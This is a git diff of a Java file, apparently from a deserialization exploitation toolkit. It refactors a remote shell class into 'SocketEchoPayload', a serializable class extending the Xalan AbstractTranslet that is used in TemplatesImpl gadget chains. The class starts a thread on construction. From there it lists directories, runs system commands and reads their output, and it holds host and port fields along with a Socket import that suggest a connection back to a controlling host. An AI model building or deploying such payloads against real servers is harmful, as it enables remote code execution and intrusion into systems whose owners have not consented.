@@ -1,21 +1,28 @@
-package shell;
+package echo;
+
+import com.sun.org.apache.xalan.internal.xsltc.DOM;
+import com.sun.org.apache.xalan.internal.xsltc.TransletException;
+import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
+import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;
+import com.sun.org.apache.xml.internal.serializer.SerializationHandler;
+import shell.Shell;
 
 import java.io.*;
 import java.net.Socket;
-import java.nio.charset.StandardCharsets;
 import java.nio.file.Files;
 import java.nio.file.Paths;
 
 /**
  * @author wh1t3P1g
- * @since 2020/9/5
+ * @since 2021/6/16
  */
-public class Shell implements Runnable {
+public class SocketEchoPayload extends AbstractTranslet implements Serializable, Runnable {
+
 
     private static String host;
     private static int port;
 
-    public Shell(){
+    public SocketEchoPayload(){
         new Thread(this).start();
     }
 
@@ -26,14 +33,13 @@ public class Shell implements Runnable {
                 File file = new File(path.trim());
                 if(file.isDirectory()){
                     File[] files = file.listFiles();
-                    if(files == null) return null;
                     for(File tmp:files){
                         if(tmp.isDirectory()){
-                            stringBuilder.append("d:").append(tmp.getAbsolutePath()).append("\n");
+                            stringBuilder.append("d:"+tmp.getAbsolutePath()).append("\n");
                         }else if(tmp.isFile()){
-                            stringBuilder.append("f:").append(tmp.getAbsolutePath()).append("\n");
+                            stringBuilder.append("f:"+tmp.getAbsolutePath()).append("\n");
                         }else{
-                            stringBuilder.append("o:").append(tmp.getAbsolutePath()).append("\n"); // other
+                            stringBuilder.append("o:"+tmp.getAbsolutePath()).append("\n"); // other
                         }
                     }
                     return stringBuilder.toString();
@@ -70,10 +76,10 @@ public class Shell implements Runnable {
 
             process.waitFor();
 
-            bufferIn = new BufferedReader(new InputStreamReader(process.getInputStream(), StandardCharsets.UTF_8));
-            bufferError = new BufferedReader(new InputStreamReader(process.getErrorStream(), StandardCharsets.UTF_8));
+            bufferIn = new BufferedReader(new InputStreamReader(process.getInputStream(), "UTF-8"));
+            bufferError = new BufferedReader(new InputStreamReader(process.getErrorStream(), "UTF-8"));
 
-            String line;
+            String line = null;
             while ((line = bufferIn.readLine()) != null) {
                 result.append(line).append('\n');
             }
@@ -156,4 +162,13 @@ public class Shell implements Runnable {
         return new Shell();
     }
 
+    @Override
+    public void transform(DOM document, SerializationHandler[] handlers) throws TransletException {
+
+    }
+
+    @Override
+    public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException {
+
+    }
 }
